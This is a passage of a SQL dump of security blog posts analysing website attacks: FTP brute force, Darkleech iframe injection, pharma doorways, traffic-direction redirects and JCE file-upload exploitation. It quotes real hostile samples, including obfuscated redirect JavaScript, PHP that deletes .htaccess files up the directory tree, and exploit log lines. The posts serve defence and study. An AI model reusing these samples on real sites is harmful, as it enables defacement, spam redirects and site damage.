checked “111111” then another checked “112233“, then third checked “222222” and “333333“, then fourth checked “444444“, and so on. Most likely this attack also assumed that some sites may use the same words both as a username and a password.The above three attack took place within 26 hours. Each of them used different approach to choosing usernames and passwords, and they came from different parts of the Internet. It means that there is a real interest in FTP brute force attacks among cyber criminals.Why didn’t I come across such attacks before?After all, brute-force attacks on WordPress and Joomla admin interfaces proved to be very efficient. What makes them so efficient is the fact that there are many millions of WP and Joomla sites out there, and out of those millions there will always be enough sites whose admins were thoughtless enough to choose weak passwords.  That’s why I see hundreds or even thousands of login attempts per day in access logs of almost every WordPress and Joomla site I work with. And unfortunately, some of those site were hacked as a results of the brute force attacks.One might think that FTP is an even better target for brute force attacks since almost every site has FTP access so the number of victims with weak FTP passwords should be substantially larger than the number of WP an Joomla sites with crackable passwords. However it’s not that easy. You should not forget than in case of WP and Joomla, hackers assume that site administrators use the CMS default usernames (admin for WP and administrator for Joomla) so they only need to guess their passwords. But in case of FTP, the username is not known. There is no default FTP username. This is especially true for shared hosting environments where every client must use a unique username. So you need to guess both username and password in order to get access to a site, which dramatically reduces efficiency of brute force attacks (don’t forget the network latency of each FTP request which prevents from testing millions of variants per seconds that one might expect in a latency-free environment).In order to try the brute force approach, hackers need to narrow down their attack to the simplest cases and hope that the Internet is so big that even a tiny fraction of sites with hackable FTP credentials will worth the effort. And the Internet is really big (there are more than 100,000,000 .com domains alone) and to have better results one needs to attacks as many of them as possible, so the set of username/password pairs should be kept as tight as possible to provide results in reasonable time. Based on the above FTP log analysis, the current approach is to target: sites that use their domain name or some easy derivative from a domain name as a username along with a weak password. sites that use the same simple words for both usernames and passwords.Another reason why FTP brute-force attacks are not popular is the FTP logins can be tracked by server administrators who can, for example limit number of consecutive failed login attempts per IP address and then block the offending IPs (for example, using the fail2ban tool).I also guess that many server and client bots might simply lack the FTP brute force functionality…Do you have any better explanation?Why did I see the FTP brute force attacks on that particular site?I have two hypothesis:1. Massive FTP brute force attacks are in the proof of concept stage. A few years ago WordPress brute force attacks were quite rare too, but once criminals figured out that they could be very successful if you had enough resources to attack a large number of site, such attacks went mainstream. So maybe if FTP brute force attacks eventually prove to deliver good results, we’ll see a flood of login attempts in FTP logs of most sites (I hope not).2. In the beginning of the post, I forgot to mention about one more failed login attempt. It used the “anonymous” username and the 66.249.72.181 IP address. The thing is the IP address belongs to Google, more specifically to Googlebot. This means that there are some FTP links (e.g. ftp://example.com ) to that site on the web and Googlebot tries to crawl them using the default anonymous username which normally doesn’t require a password and is used for public FTP sites. Here is the explanation from John Mueller (Webmaster Trends Analyst at Google):When we find links to FTP content, we’ll generally attempt to crawl  those URLs. If they’re publicly accessible and return normal content, we  may choose to index them as well. While it’s not that common, there are  occasionally queries where a file on an FTP server is a good result.So my guess is such attacks may be limited to the sites that have direct FTP links to them on the web.Do you have any better explanation?Just in case. No, the original successful FTP hack that I investigated was not a result of a brute force attack. The username was not obvious and the  password was strong. The attackers used the tried-and-true credential  theft approach.To webmastersRegardless of the chances to see massive FTP brute force attacks in future, the described example should be considered as yet another lesson to all webmasters, who should realize all risks associated with FTP.Carefully choose both username and password.They should not be the sameThe username shoudn’t be easy to guess (e.g.  your site domain name is not the best choice)The password should be strong.Don’t save passwords in FTP programs. Configure them so that they ask for a password every time you connect to your site. If you work with multiple sites and/or don’t like the idea of memorizing many passwords, consider using password managers like KeePass or LastPass — they save your passwords much more securely.Consider using SFTP instead of FTP that sends your passwords in plain  text (they can be easily intercepted, for example, when you use public Wi-Fi). Most popular FTP  programs support SFTP, so the switch should be painless. If you  manage your own server, consider not installing an FTP server  altogether (or uninstalling it now if there are no others users who can’t use SFTP).If you manage a server, consider blocking multiple consecutive failed login attempts at a firewall level (tools like fail2ban may help). Moving FTP to a custom port may also help.Minimize risks of infecting your local computer (which brings you a step closer to password theft). Make sure that all software on your computer is up-to-date. This includes all OS  security updates, all browser updates and all browser plugin updates. Here you can check whether your browser is vulnerable:https://browsercheck.qualys.com/http://www.mozilla.org/en-US/plugincheck/Related posts:10 FTP Clients Malware Steals Credentials FromBeware: FileZilla Doesn’t Protect Your PasswordsWeak Passwords and Tainted WordPress WidgetsIntroduction to Website Parasites﻿                                                                                  Tags: brute-force FTP log analysis                                                    			                                            « Rotating Iframe URLs – One a Minute                Analyzing [Buy Cialis] Search Results »            								Comments are closed.', '', 'http://blog.unmaskparasites.com/2013/06/26/ftp-brute-force-attacks/\n');
INSERT INTO `unmask` (`id`, `title`, `author`, `publishdate`, `content`, `tags`, `url`) VALUES (71, '“Fancybox for WordPress Has Expired” Infection', 'unmask', '01 Apr 15', 'Loading site search ...          			                “Fancybox for WordPress Has Expired” Infection                          01 Apr 15   Filed in General, Short Attack Reviews, Website exploits                Today I began to notice quite a massive and very unusual attack that leverages vulnerabilities in older versions of the FancyBox for WordPress plugin.As you might know, versions 3.0.2 and older of this plugin allowed anyone to craft special POST requests to /wp-admin/admin-post.php or /wp-admin/admin-ajax.php and change values of specific plugin options in WordPress database. The plugin uses the modified options to build its own JavaScript code. As a result, the malicious content gets injected into generated WordPress pages.A typical malicious injection looks like this:Such attacks use the documented exploit code to inject malicious code into the “padding” value.The exploited vulnerability had been fixed on February 4th. Nonetheless, many blogs failed to update the plugin and hackers routinely find such blogs and infect them.The today’s attack also uses this exploit and modifies the “padding” value, but the code it injects cannot be called malicious:When visitors load such “infected” pages, they see this warning:WARNING: This version of the Fancybox for WordPress plugin has expired! Please upgrade to the latest version!And when they click on the “OK” button, they automatically get redirected to the Fancybox for WordPress changelog page in the official WordPress plugin repository.On one hand, this infection makes blogs unusable since it redirects visitors to WordPress plugin repository before they can read anything. On the other hand, it is very hard to ignore such a warning — if site owners want people to visit their sites they have to upgrade (or remove) the vulnerable version of the plugin ASAP.Now is the time to check if your blog shows such warnings. If you don’t see them, it’s not a reason to relax and wait for such a hard push to upgrade. Make sure all your themes and plugins are up-to-date now.                                                                                   Tags: April1 Fancybox WordPress                                                    			                                            « Darkleech Update – November 2014                            			    Reader\'s Comments (%)       	        			        			Pascal | 02 Apr 2015 8:43 am 						I’m a little suspicious because this article is tagged with “April1″ – though I don’t really see the sense in making this a hoax?', '', 'http://blog.unmaskparasites.com/2015/04/01/fancybox-for-wordpress-has-expired-infection/\n');
INSERT INTO `unmask` (`id`, `title`, `author`, `publishdate`, `content`, `tags`, `url`) VALUES (72, 'Darkleech Update – November 2014', 'unmask', '27 Nov 14', 'Loading site search ...          			                Darkleech Update – November 2014                          27 Nov 14   Filed in Short Attack Reviews, Website exploits                Just wanted to document some latest changes in Darkleech behavior that may help you detect it.I’d like to thank internet security enthusiasts who share their findings with me. Without you, I could have easily missed these new (?) details.Quick recapDarkleech is a root level server infection that installs malicious Apache modules. The modules inject invisible iframes into server response when it is already prepared (linebreaks added for readability).<style>.a4on6mz5h { position:absolute; left:-1376px; top:-1819px} </style> <div class=\"a4on6mz5h\"><ifr ame src=\"hxxp://tfmjst .hopto .org/nsiumkogckv1tv4locfzyv2eykqss9ltfb9wnmhfqz1ol2\" width=\"247\" height=\"557\"></ifram e></div>All the elements of this code are random and auto-generated on the fly (style name, coordinates, iframe diminsions, URL paths). Moreover, the iframe domains change every few minutes — lately hackers prefer free No-IP.com dynamic DNS hostnames like hopto.org, ddns.net, myftp.biz, myftp.org, serveftp.com, servepics.com, etc.This infection is hard to detect as it only shows up once per IP per day (or maybe even more seldom). And since it works on a low system level, it can detect if server admins are logged in, so it lurks until they log out — this means that they won’t see anything even if they monitor outgoing TCP traffic.For more details, please check the links at the bottom of this post.What’s new?IE=EmulateIE9Recently, I’ve been pointed at the fact that now Darkleech also adds the following meta tag setting IE 9 compatibility mode in Internet Explorer. It looks like it searches for the </head> tag and replaces it with the following code (again, linebreaks added for readability):<meta http-equiv=\'x-ua-compatible\' content=\'IE=EmulateIE9\'></head><style>.syxq9la69 { position:absolute; left:-1666px; top:-1634px} </style> <div class=\"syxq9la69\"><iframe src=\"hxxp://jsnrgo .ddns .net/nsiumkogckv1tv4locfzyv2eykqss9ltfb9wnmhfqz1ol2\" width=\"285\" height=\"554\"></iframe></div>This IE=EmulateIE9 instruction tells modern versions of Internet Explorer to render a web page as if they were IE 9, using all the features that has been deprecated in IE 10 and newer versions of IE. Some of the legacy features are known to have vulnerabilities and hackers try to exploit them turning the compatibility mode on (e.g. VML-related exploit)_SESSION_ID cookieIn addition to temporary IP blacklisting, Darkleech also uses the _SESSION_ID cookie that expires in one week. It adds the following cookie into response headers:Set-Cookie: _SESSION_ID=-1; expires=Wed 03-Dec-2014 09:32:48 GMT; path=/So even if you change your IP address (e.g. if you have a dynamic IP address) you still won’t see malware for the following 7 days. So don’t forget to clear/block cookies if you are trying to reproduce infected response.Most likely the IP blacklisting also works for one week now too.Just a couple of more things:As you might have figured out, it looks for Internet Explorer User-Agent (and derivatives like Maxthon, Avant).Referer is not important at the moment. I managed to trigger it even without the Referer header.That’s it for today. Please let me know if you have some other news about Darkleech.Previous posts about Darkleech:Malicious Apache Module Injects IframesRFI: Server-wide iframe injectionsWorking With the Darkleech Bitly DataDarkleech + Bitly.com = Insightful Statistics (Sucuri blog)Server Compromises – Understanding Apache Module iFrame Injections and Secure Shell Backdoor (Sucuri blog)                                                                                   Tags: Apache Darkleech EmulateIE9 No-IP                                                    			                                            « Most Contradictive Doorway Generator                “Fancybox for WordPress Has Expired” Infection »            			    Reader\'s Comments (2)       	        			        			WordPress Malware Causes Psuedo-Darkleech Infection | Sucuri Blog | 26 Mar 2015 4:25 pm 						[…] and this is the code from November of 2014 […]                   			        			WordPress Malware Causas Psuedo-Darkleech Infección | Sucuri Español | 13 Apr 2015 10:41 pm 						[…] y este es el código de noviembre de 2014: […]', '', 'http://blog.unmaskparasites.com/2014/11/27/darkleech-update-november-2014/\n');
INSERT INTO `unmask` (`id`, `title`, `author`, `publishdate`, `content`, `tags`, `url`) VALUES (73, 'Most Contradictive Doorway Generator', 'unmask', '12 Sep 14', 'Loading site search ...          			                Most Contradictive Doorway Generator                          12 Sep 14   Filed in Short Attack Reviews                Check this thread on WordPress.org forum. The topic starter found a suspicious PHP file and asked what it was doing.The code analysis shows that it’s some sort of a spammy doorway. But it’s a very strange doorway and the way that it works doesn’t make sense to me.First of all, this script has a random text and code generator. The output it generates is [kind of] always unique. Here is a couple of output pages:http://pastebin.com/ymwMZMWPhttp://pastebin.com/Y6B7WM2T...<title>Is. Last spots brows: Dwelling. Immediately moral.</title></head><body>listend40721<span>Flowerill merry chimes - has: Her - again spirits they, wooers. Delight preserve. For he. Free - snow set - grave lapped, icecold made myself visitings allow, beeves twas. Now one:...We usually see such a random text, when spammers want search engines to index “unique” content with “right” keywords. But…1. the script returns the page with the 404 not found code.header(\"HTTP/1.1 404 Not Found\");so the page won’t be indexed by search engines.2. The obfuscated JavaScript code at the bottom of the generated page redirects to a pharma site after about a second.function falselye() { falselya=29; falselyb=[148,134,139,129,140,148,75,145,140,141,75,137,140,128,126,145,134,140,139,75,133,143,130,131,90,68,133,145,145,141,87,76,76,145,126,127,137,130,145,138,130,129,134,128,126,143,130,144,75,130,146,68,88];falselyc=\"\"; for(falselyd=0;falselyd<falselyb.length;falselyd++) { falselyc+=String.fromCharCode(falselyb[falselyd]-falselya); } return falselyc; } setTim eout(falselye(),1263);decodedwindow.top.location.href=\'hxxp://tabletmedicares .eu\';Update: on another site the script redirected to hxxp://uanlwkis .com (also pharma site), which was registered only a few days ago on Sept 6th, 2014.But the generated text has no pharma keywords. One more hint that it’s not for search engines. Maybe it’s an intermediary landing page of some email spam campaign that just needs to redirect visitors? I saw many such landing pages on hacked sites. But it most cases they looked like the decoded version of the script — just a redirection code. Indeed why bother with sophisticated random page generator if no one (neither humans nor robots) is going to read it?3. There is also this strange piece of code:$s=\'/\';if (strtolower(substr(PHP_OS,0,3))==\'win\') $s=\"\\\\\\\\\";$d=array(\".$s\");$p=\"\";for($i=1; $i<255; $i++){$p.=\"..$s\";if (is_dir($p)){array_push($d,$p);}else{break;}}foreach($d as $p){$a=\"h\".\"tac\".\"c\".\"es\".\"s\";$a1=$p.\".$a\";$a2=$p.$a;$a3=$p.\"$a.txt\";@chmod($a1,0666);@unlink($a1);@chmod($a2,0666);@unlink($a2);@chmod($a3,0666);@unlink($a3);}What it does it tries to find an delete(!) all file with names .htaccess, htaccess and htaccess.txt in the current directory and all(!) the directories above the current.That just doesn’t make sense. Why is it trying to corrupt websites? I would understand if it only removed its own files and injected code in legitimate files, but it tries to just remove every .htaccess (and its typical backups) without checking what’s inside. That’s a really disruptive and annoying behavior given that many sites rely on the settings in .htaccess (e.g. most WordPress and Joomla sites).It’s indeed a most contradictive doorway generator that I ever seen. I can’t find any good explanation why it does things the way it does. Maybe you have any ideas?Related posts:Analyzing [Buy Cialis] Search ResultsRich Snippets in Black Hat SEOCareless Webmasters as WordPress Hosting Providers for SpammersHtaccess Redirect to Example.ru/dir/index.phpIntroduction to Website Parasites                                                                                  Tags: doorway htaccess redirect                                                    			                                            « Google -> Doorway -> Google -> Spam                Darkleech Update – November 2014 »            								Comments are closed.', '', 'http://blog.unmaskparasites.com/2014/09/12/most-contradictive-doorway-generator/\n');
INSERT INTO `unmask` (`id`, `title`, `author`, `publishdate`, `content`, `tags`, `url`) VALUES (74, 'Google -> Doorway -> Google -> Spam', 'unmask', '11 Jun 14', 'Loading site search ...          			                Google -> Doorway -> Google -> Spam                          11 Jun 14   Filed in Uncategorized                Just a few thoughts about an interesting behavior of a black-hat SEO doorway.Typically hackers create doorways on compromised sites to make search engines rank them for certain keywords and then, when searchers click on the links in search results, those doorways redirect them further to a site that hackers really promote. Sometime that redirect may go through some TDS (traffic directing service) but the whole scheme remains pretty much the same:Search results -> doorway -> beneficiary siteToday, when doing a backlink research of one of such pharma doorways, I encountered a different scheme — a one with a loop.The doorway had this URL structure:http://www.hacked-site.com/blog/?prednisolone-without-prescriptionWhen I checked it in Unmask Parasites or in Google cache, I saw spammy content with links to doorways on other hacked sites. Quite typical.When I opened that page in a web browser, it redirected to a TDShxxp://bh2r3gof .biz/sutra/in.cgi?5&from=90dc16aaf3e24ea68c94c3f784a37ff9&gdw=w-48&gdf=%2F90dc16aaf3e24ea68c94c3f784a37ff9-f08f149982bf04ffaa308aba00b2d569.txt&host=www.hacked-site.com&kw=prednisolone%20without%20prescription&HTTP_REFERER=https%3A%2F%2Fwww.google.com%2F%3Fsource%3Dnoref%26q%3Dprednisolone%2520without%2520prescriptionCloaking and conditional redirects to traffic directing services are also quite typical for doorways.Then TDS made another hop:hxxp://bh2r3gof .biz/sutra/in.cgi?5&from=90dc16aaf3e24ea68c94c3f784a37ff9&seoref=8bB06MP5xFTR3TkqmNILbbW5mW30f%2B%2FMiQdbatwxiv5CUUTkQjEO75VtTs7IRqdVTmPfmX……..2FIXHlBdqV6iDd1ruYQMhqmYVCozdkTrAN76fOABiczAnd then I ended up on … Google:http://www.google.com/search?q=prednisolone+without+prescriptionAnd that is not very typical. But interesting.One one hand, it looks like the spammers didn’t consider me as a target traffic (probably because of my IP) and redirected back to the Google search results page for the same query that I supposed to be using when found that site. For some, this chain of redirects may look as if they clicked on a search result and then Google thought for some time and reloaded the same page, which may look like just a glitch.On the other hand, it looks like a second level of search engine optimization, when spammers fine tune a search query that may return better doorways. I can’t help thinking about this because when I see the search results on Google pages that the TDS redirects me to, I realize that most of them are doorways on hacked sites (yes, including those with fake stars in ratings).I know, it’s quite pointless. Why redirect people who already clicked on your doorway to a new set of search results? Although those results may contain some of your other doorways, there is no guarantee that the searcher will not go away or click on them and not on links of your competitors? And you can’t control Google search results — it may happen that there will be no your doorways on the results page.OK. Let’s try to think as the TDS owners. The TDS recognizes the traffic that it doesn’t need for the pharma campaign. It mayredirect it to pharma landing pages anyway (which may decrease the quality and the price of such a traffic)dispose of that traffic altogether (redirect it to a neutral third-party site, like Google)try to monetize that traffic anyway — redirect it to some scam site, porn site, malware site or any other resource that knows how to take advantage of low quality traffic.<warning:unfounded speculation>But what it the spammers also run another campaign that targets the traffic that doesn’t fit their pharma campaign? They can simply redirect the traffic to landing pages of the second campaign. But such traffic will not be targeted. People searched for different things. So maybe it is worth it to “re-target” the traffic and redirect the searchers to a Google result page for keywords relevant to that second campaign and that contains links to their doorways.Here’s the scenario:People search something on Google and click on some result. For some reason Google reloads the page and shows them completely different results for a different query. Some searchers will definitely leave (don’t worry, this was unwanted traffic anyway) but some may become interested in what Google offers them and click on results (after all spammers usually promote something that people need and if it comes from Google it looks more legit). So, instead of either lost or untargeted traffic, they get targeted traffic of people who willingly clicked on search results. All they need to do is make sure their doorways dominate for relevant search queries (shouldn’t be hard since the TDS provide the search query itself and there is no need to rank for short generic queries.)</warning:unfounded speculation>OK, enough speculations. That particular campaign was not using the second level Google optimization. It simply dumped unneeded traffic back to Google. When opening the same doorways from different country IPs, the TDS redirected me to a random “Canadian Pharmacy” site from its pool of about a dozen of sites.Anyway, the point of this post is despite of Matt Cutts’ recent announcement of rolling out the second ranking update for “very spammy queries” I still see that 50% or more of top search results for pharma keywords still point to doorways on hacked sites.This past weekend we started rolling out a ranking update for very spammy queries: http://t.co/NpUZRqpnBI— Matt Cutts (@mattcutts) May 21, 2014And as long as “very spammy queries” return “very spammy results”, there will be incentive for black hat SEOs to hack sites and create doorways there.Related posts:Analyzing [Buy Cialis] Search ResultsRich Snippets in Black Hat SEOCareless Webmasters as WordPress Hosting Providers for Spammers“Cheap Vista” or Cloaked Spam on High-Profile SitesIntroduction to Website Parasites                                                                                  Tags: black hat seo doorway TDS                                                    			                                            « Working With the Darkleech Bitly Data                Most Contradictive Doorway Generator »            			    Reader\'s Comments (2)       	        			        			SearchCap: Google PayDay Loan 3.0, Bing Ads URL Tagging & World Cup Fever | 12 Jun 2014 9:14 pm 						[…] Google -> Doorway -> Google -> Spam, Unmask Parasites. Blog. […]                   			        			Rosanne & Jerry Shalf | 03 Dec 2014 6:27 pm 						I keep getting redirected to a Canadian drugstore site when I type in ashlandmuseum.org. Before the Canadian drugstore site pops up I see something that looks like tds….etc. but it quickly moves to the Canadian site, so I don’t know the complete set of letters.  I have a macbook pro 2012 and am using Maverick 10.9.5 OS.  It doesn’t always happen, which is weird, and it only happens on my computer, not others.  It happens when I use Firefox and Safari.  How do I get rid of it?  I had Applecare go through the machine and we got rid of various viruses, but we couldn’t fix this one.  Applecare said it was because of something Google did and only Google can fix, but I can’t figure out how to reach Google and ask for help.  Please, somebody, help me!!', '', 'http://blog.unmaskparasites.com/2014/06/11/google-doorway-google-spam/\n');
INSERT INTO `unmask` (`id`, `title`, `author`, `publishdate`, `content`, `tags`, `url`) VALUES (75, 'Working With the Darkleech Bitly Data', 'unmask', '10 Feb 14', 'Loading site search ...          			                Working With the Darkleech Bitly Data                          10 Feb 14   Filed in General                Data Driven Security took the time to analyze the raw data that I published in my recent post on Sucuri blog about how I used Bitly data to understand the scale of the Darkleech infection.In their article, they have a few questions about data formats, meaning of certain fields and some inconsistencies, so I’ll try to answer their questions here and explain how I worked with the data.So I needed to get information about all the links of the “grantdad” bitly account.I checked the API and somehow missed the “link_history” API request (it was the first time I worked with the bitly API), so I decided to screenscrape the web pages where bitly listed the links creaded by grantdad. 1,000 pages with 10 links on each. Since pages didn’t contain all the information I needed I only collected the short links so that I could use them later in API calls to get more detailed information about each of them.As you can see I was limited with the 10,000 links that bitly made available via their web interface. Not sure if I could get more links via that link_history API. Right now it returns “ACCOUNT_SUSPENDED” and when it was not suspended, API calls for known links beyond those 10,000 produced various errors.When I compiled my list of 10,000 links I used the following API calls to get information about each of the links:Referring domainsAPI:link/referring_domains — for each link, it returned a list of domains referring traffic to this link (in our case sites, containing the iframes) along with the number of clicks from each domain. This helped me compile this list of iframe loads per domain: http://pastebin.com/HYaY2yMb. Then I tried to resolve each of the domain names and created this list of infected domains per IP address: http://pastebin.com/Gxr51Nc1.I also used this API call to get number of iframe loads for each bitly link.InfoAPI:link/info – this gave me timestamps of the links and their long URLs (the rest information was not interesting for my research). Unfortunately, this particular API call is poorly documented so I can only guess what this timestamp mean. It is actually called “indexed“. But I guess it’s the time when the link was created. It is definiteley not the time of the first click because there were no registered clicks for many of the links. As a result, I compiled these datasets:http://pastebin.com/UmkDZZp0http://pastebin.com/w7Kq3ybV ,which contain tab separated values of “bitly link id”, “timestamp”, “# of clicks/iframe loads”, and “long URL”.At that point, I already had the number of iframe loads from the previous step (“link/referring_domains“). Then, for readability, I converted the numeric timestamp using this Python function datetime.datetime.fromtimestamp(). However, you can notice that the second dataset (for January 28th) has a different date format. Instead of “2014-01-25 19:10:07” it uses “Jan 28 23:10:19“. Why? Because of pastebin.com. Because it doesn’t allow unregistered users to post more than 500Kb of data (I deliberately post such data as a guest). Removing the year from the date allowed me to save 4 bytes on each row and fit the dataset in 500Kb.Actually this 500Kb limit is the reason why I have separate pastebins for each date and only specify bitly ids instead of the full bitly links.CountriesAnd finally, API:link/countries – for each link, it returned a list of countries referring traffic to this link along with the number of clicks from those countries. This helped me compile this list of iframe loads per country http://pastebin.com/SZJMw3vx.The last dataset Feb 4-5When I wrote my blogpost on February 5th, I noticed that there were new links available on the Bitly.com grantdad acount page. I began to browse pages of his links and figured that most of the links were the same (Jan 25 and 28) but around 1,700 of them were new (late February 4th and the beginning of February 5th). I immediately repeated the same procedure that included screenscraping, and 3 API calls for each new bitly link. After that I created this new dataset http://pastebin.com/YecHzQ1W and updated the rest datasets (domains, countries, etc).Some more detailsIf you check the total numbers in these two datasets (domains) http://pastebin.com/HYaY2yMb and (countries) http://pastebin.com/SZJMw3vx you’ll see the different in total number of iframe loads: 87152 and 87269. I don’t know why. I used the same links just different API calls (referring_domains and countries) and the totals are supposed to be the same. I didn’t save the “per link” data so can’t tell exactly whether it was my error or the bitly API produces slightly inconsistent results. Anyway, the difference is neglectable for my calculations and doesn’t affect the estimations (given that I tried to underestimate when in doubt ).I didn’t check for duplicates that guys from Data Driven security found in my datasets. They must have to do with my screenscraper and the way that Bitly.com displays links in user accounts. The total number of scraped links matched the number of links that Bitly reported for the user. The extra 121 clicks that these duplicates are responsible for are so close to the 117 difference that I mentioned above so I wonder if these numbers somehow connected? Anyway, this shouldn’t affect the accuracy of the estimates either.Building the geo distribution mapFor the map, I used the Geochart from Google visualization. Since the difference in numbers of clicks for the top 3 countries and the lower half of the list was 3 orders of magnitude, I had to re-scale the data so that we could still see the difference between countries with 50 iframe loads and 2 iframe loads.. I used a square of a natural logarithm for thatMath.pow( Math.round( Math.log(i)), 2)This gave me a nice distribution from 0 to 100 and the below map.IFrame Load Geo DistributionSpeculation on the link generationAfter checking the link creation per minute-of-an-hour distribution, Bob Rudis wondered:This is either the world’s most inconsistent (or crafty) cron-job or grantdad like to press ↑ + ENTER alot.I guess, it was neither cron-job nor manual link creation. I think the [bitly] links were created on-demand. So if someone loads a page and Darkleech needs to inject an iframe then it (or rather the server it works with) generates a new bitly link. Given that this malware may lurk on a server, there may be time periods when no malicious code is being injection into any web pages across all the infected servers. At the same time, the bitly links with zero clicks may refer to page loads by various bots (including our own) when the malicious code is injected but the iframe is never loaded. On the other hand, the volume of bitly links with 0 clicks (~35%) suggests that there might really more complex link generation mechanism than a simple “on-demand” approach.Anyway, that’s great when people double check our data and try to find new interesting patterns there. Make sure to let me know (here or on the Sucuri blog) if you find more patterns and inconsistencies, or have any comments on how the Darkleech works.Related posts:Malicious Apache Module Injects IframesRFI: Server-wide iframe injectionsBety.php Hack. Part 2. Black Hats in Action.Introduction to Website Parasites                                                                                  Tags: Bitly Darkleech data statistics                                                    			                                            « Invasion of JCE Bots                Google -> Doorway -> Google -> Spam »            								Comments are closed.', '', 'http://blog.unmaskparasites.com/2014/02/10/working-with-the-darkleech-bitly-data/\n');
INSERT INTO `unmask` (`id`, `title`, `author`, `publishdate`, `content`, `tags`, `url`) VALUES (76, 'Invasion of JCE Bots', 'unmask', '27 Jan 14', 'Loading site search ...          			                Invasion of JCE Bots                          27 Jan 14   Filed in Website exploits                Joomla has been one of the most popular CMS for a long time.  It powers a huge number of sites.  That’s great! The flip side of this fact is Joomla has been very popular for a long time and there are still very many sites that use older versions of Joomla as well as older version of Joomla components. For example, the 1.5.x branch of Joomla (2008-2010) still has a noticeable share in live Joomla sites.Old versions may work well for your site but they have multiple well known security holes, so they are the low hanging fruit for hackers. Let me show this using a real world example.JCE attackThere is a JCE component — a fancy content editor that can be found almost on every Joomla site. It has a well known security hole that allows anyone to upload arbitrary files to a server.You can easily find a working exploit code for this vulnerability.  What it does is:Checks whether a vulnerable version of JCE is installed (2.0.11, 2.0.12, 2.0.13, 2.0.14, 2.0.15, 1.5.7.10, 1.5.7.11, 1.5.7.12, 1.5.7.13, 1.5.7.14)Exploits the bug in the JCE image manager to upload a PHP file with a .gif extenstion to the images/stories directoryThen uses a JSON command to rename the .gif file to *.php.Now you have a backdoor on a server and can do whatever you want with the site.This is how this attack looks in logs (real example):197.205.70.37 - - [23/Jan/2014:16:46:54 -0500] \"POST /index.php?option=com_jce&task=plugin&plugin=imgmanager&file=imgmanager&method=form&cid=20&6bc427c8a7981f4fe1f5ac65c1246b5f=cf6dd3cf1923c950586d0dd595c8e20b HTTP/1.0\" 200 302 \"-\" \"BOT/0.1 (BOT for JCE)\"197.205.70.37 - - [23/Jan/2014:16:46:55 -0500] \"POST /index.php?option=com_jce&task=plugin&plugin=imgmanager&file=imgmanager&method=form&cid=20 HTTP/1.0\" 200 329 \"-\" \"BOT/0.1 (BOT for JCE)\"197.205.70.37 - - [23/Jan/2014:16:46:55 -0500] \"GET /images/stories/3xp.php HTTP/1.0\" 200 465 \"-\" \"BOT/0.1 (BOT for JCE)\"As I mentioned, JCE is a very popular component and there are still many sites that use old versions of this component. No wonder, hackers are scanning the Internet for such vulnerable sites.  They reworked the exploit code for use in their automated tools that relentlessly test millions of sites, one by another.  These days, I can find multiple requests with the “BOT/0.1 (BOT for JCE)” User-Agent string in logs of almost every site that I check, even in logs of sites that have never had Joomla installed.I’d like to share some interesting statistics of a real site that had been hacked using this JCE hole and then was being routinely reinfected every day.7,409 requests with the User-Agent “BOT/0.1 (BOT for JCE)” that came from 785 different IPs during the period of Dec 24th – Jan 24th (one month)239 requests from 51 unique IP addresses during the last 24 hours4 independent (uploaded different types of backdoors) successful infections during one day.plus, multiple tests for other vulnerabilities.To webmastersAs you can see,  this is something that you can’t neglect or consider an insignificant threat.  It’s silly to hope that hackers won’t find your site. Today hackers have resources to spider the Internet almost as efficiently as Google just about 10 years ago, so there is almost no chance your site will stay unnoticed. The only way to prevent the hacks is to be proactive:  keep all software up-to-date and harden your sites.In case of this particular JCE attack:Make sure to upgrade your Joomla site to the most current version.Upgrade JCE to the latest version. You can find download packages for all the three branches of Joomla here.Protect all file upload directories and all directories that shouldn’t contain .php files. For example, place the following .htaccess file there to prevent execution of PHP files:<Files *.php>deny from all</Files>Try blocking requests with the “BOT/0.1 (BOT for JCE)” User-Agent string.  Of course, this shouldn’t be considered as a real protection. Hackers can change the User-Agent string to whatever they want. But it can help keep some dumb annoying bots away from your site.If, for some reason, you can’t upgrade your site at this moment, consider placing it behind a website firewall that will block any malicious traffic before it reaches your server.  This is something that we call virtual patching in Sucuri CloudProxy.                                                                                  Tags: exploit JCE Joomla                                                    			                                            « Reporting Suspicious Styles                Working With the Darkleech Bitly Data »            			    Reader\'s Comments (8)       	        			        			Jim Walker | 28 Jan 2014 5:47 pm 						Nicely done!The JCI component “problem” and has been a thorn in the Joomla communities side for years.I would go so far as to say that 1/2 of all of the hacked Joomla installations I’m asked to repair are JCE exploit related.As mentioned, simply adding the .htaccess “no execute php” file within the images/stories directory generally does the trick, though upgrading is always best.Personally, for this particular exploit, I prefer the below in my .htaccess file:# This line turns off directory listingsOptions -Indexes# This line forces scripts to load as text.Addhandler text/plain .pl .cgi .php .py .jsp .asp .shtml .shI like how you linked out to Google and known JCE exploits as well.A quality post top to bottom. Kudos!                   			        			Denis | 28 Jan 2014 7:12 pm 						Thanks Jim,That “text/plain” handler also does the trick and covers a broader range of attacks.I don’t want to link directly to exploits. But if you want to find the information, this Google search is enough. At the same time, if there is some new JCE file upload vulnerability, this search will show it too, so the link will remain fresh and useful.                   			        			machineX | 19 Sep 2014 9:05 am 						I just seen it in some logs for the second time. We do not use joomla. But I think your .htaccess code is very useful in preventative measures for sites overall.                   			        			Brian M | 20 Feb 2014 3:10 pm 						I’m curious if you would have any more information on exactly what is allowing the exploit to work? I understand it’s an exploit in code which was in an old version of Joomla, but my vBulletin sites are apparently being exploited by this Bot for JCE script. I do not have any pieces of Joomla installed on the server – at least, not that I’m aware of. Thankfully Microsoft Security Essentials is catching the backdoor/shell script being uploaded to the site and is removing it before they can use it, but it scares me that they’re able to upload the file to my site in the first place. I’ve tried to get help from vBulletin but they brush it off as not being on their end.                   			        			Denis | 11 Jun 2014 5:13 pm 						In case of Joomla JCE, it just uses a bug to upload a PHP file as a .gof and then change it’s extension to .php.If you don’t have Joomla, then you might see multiple attempts to scan your site for that JCE security hole. They do it on every site. If they find it – they exploit it, if not they move on to the next site. So what you are seeing is probably just attack attempts, not successful attacks. On the other hand, if hackers find vulnerabilities in vBulletin or any other type of site, they’ll most likely upload pretty much the same backdoors as if it was Joomla.vBulletin may be slightly different as most of it’s malware lives in its database.                   			        			JCE Joomla Extension Attacks in the Wild | Sucuri Blog | 26 Mar 2014 8:11 pm 						[…] Unmask: Invasion of JCE Bots […]                   			        			catalina | 30 Mar 2014 6:23 am 						If I understood, I have to open my .htaccess file and insert these lines:# This line turns off directory listingsOptions -Indexes# This line forces scripts to load as text.Addhandler text/plain .pl .cgi .php .py .jsp .asp .shtml .shThats it?Which are the “collateral effects” of this?Thanks in advanceCatalina                   			        			Denis | 11 Jun 2014 5:16 pm 						This code makes web server treat such files as regular text files. I.e. instead 